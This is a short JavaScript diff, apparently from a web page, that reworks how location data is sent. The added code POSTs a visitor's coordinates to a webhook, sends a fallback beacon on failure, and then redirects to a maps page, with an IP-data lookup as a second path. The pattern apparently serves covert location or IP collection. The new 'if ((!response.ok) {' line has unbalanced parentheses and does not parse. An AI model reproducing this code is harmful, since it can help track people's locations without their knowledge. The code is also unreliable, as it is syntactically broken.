@@ -512,14 +512,21 @@
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(data)
             });
-            if (response.ok) {
-              console.log("Webhook POST sent");
+            
+            if ((!response.ok) {
+              const errorText = await response.text();
+              console.warn("POST failed with status:", response.status, "Response:", errorText);
+              await fallbackBeacon(`post-failed-${response.status}`, pos);
             } else {
-              throw new Error("POST failed");
+              console.log("Webhook POST success");
             }
-          } catch {
-            await fallbackBeacon("fetch-fail", pos);
+          } catch (err) {
+            console.error("POST error:", err.message);
+            await fallbackBeacon("post-error", pos);
           }
+          
+          // After POST + fallback
+          redirectToMaps(data.lat, data.lon); 
         },
         async () => {
           await loadIpData();
